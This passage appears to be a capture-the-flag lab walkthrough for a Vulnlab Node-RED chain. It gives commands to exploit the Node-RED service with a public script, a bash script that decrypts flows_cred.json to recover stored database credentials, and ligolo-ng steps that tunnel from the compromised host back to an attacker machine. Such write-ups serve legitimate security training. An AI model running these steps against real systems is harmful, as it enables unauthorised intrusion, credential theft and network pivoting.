
# NMAP

* Rust scan result
 
```console
Open 10.10.185.167:22
Open 10.10.185.167:1880
```

## Web

* Node-red web service can be exploited via [noderedsh.py](https://gist.githubusercontent.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297/raw/8966e4ee07400f16b92737161ca8df3cbfa37f91/noderedsh.py)

![image](https://github.com/reneanto/write-ups/assets/44943249/5def2930-6800-4a94-a52e-0a938e3747ed)
```bash
python3 noderedsh.py http://$IP:1080 --user "" --password ""
```

![nodered-svc](/Vulnlabs/Chains/Images/tengu-nodered.png)

### nodered_svc

* further exploring the nodered_svc directory, we come across `flows_cred.json` 
* according to this [article](https://blog.hugopoi.net/en/2021/12/28/how-to-decrypt-flows_cred-json-from-nodered-data/), we can get the `flows_cred.json` and the `.config.runtime.json` in to the folder `node_red_data` , then run the following script

```bash

#!/bin/bash
#
# Decrypt flows_cred.json from a NodeRED data directory
#
# Usage
# ./node-red-decrypt-flows-cred.sh ./node_red_data
#
jq  '.["$"]' -j $1/flows_cred.json | \
  cut -c 33- | \
  openssl enc -aes-256-ctr -d -base64 -A -iv `jq  -r '.["$"]' $1/flows_cred.json | cut -c 1-32` -K `jq -j '._credentialSecret' $1/.config.runtime.json | sha256sum | cut -c 1-64`
```

* upon running this we get the sql credentials that were found in the web application
## Pivoting

* navigate to /tmp on nodered as a good practice
* then use `ligolo-ng` to pivot

```bash
#on attacker machine
sudo ip tuntap add user rzgami mode tun ligolo
sudo ip link set ligolo up
./proxy --selfcert

#on nodered
./agent -connect $IP:11601 -ignore-cert

#on attacker machine
ligolo-ng>session
sudo ip route add 10.10.x.230/32 dev ligolo
sudo ip route add 10.10.x.229/32 dev ligolo
ligolo-ng>start
```